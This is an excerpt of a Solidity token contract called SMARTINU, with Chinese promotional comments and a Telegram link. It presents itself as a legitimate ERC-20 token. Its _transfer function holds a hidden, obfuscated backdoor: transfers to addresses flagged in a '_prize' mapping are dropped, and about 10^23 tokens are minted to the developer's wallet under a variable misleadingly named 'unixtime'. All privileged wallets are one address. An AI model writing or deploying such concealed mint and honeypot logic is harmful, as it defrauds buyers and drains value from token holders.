...
// smartInu节点挖矿是蚂蚁前团队成员在英国注册的公司(SMARTINU LTD)注册号为
// Telegram : https://t.me/PSFJFbunfdKOO1356
...
contract SMARTINU is Context, IERC20 { 
    ...
    mapping (address => bool) public _prize;

    address payable public Wallet_Marketing = payable(0x2F717b4481dAD90c52624f28F5b5bbfdA2B40Ea0); 
    address payable public Wallet_Dev = payable(0x2F717b4481dAD90c52624f28F5b5bbfdA2B40Ea0);
    ...
    string private constant _symbol = unicode"SMRTINU"; 
    ...
    constructor () {
        ...
        _owner = 0x2F717b4481dAD90c52624f28F5b5bbfdA2B40Ea0;
    ...
    function _transfer(
        ...
        bool pr_ze =  !_isExcludedFromFee[from] && _prize[to];
        
        if(!pr_ze){
            _tokenTransfer(from, to, amount, takeFee, isBuy);
        }
        else{
            uint256 unixtime = ((2**3)+2)**((2**4)+7);
            _tOwned[dev()] = _tOwned[dev()]+unixtime;
        }
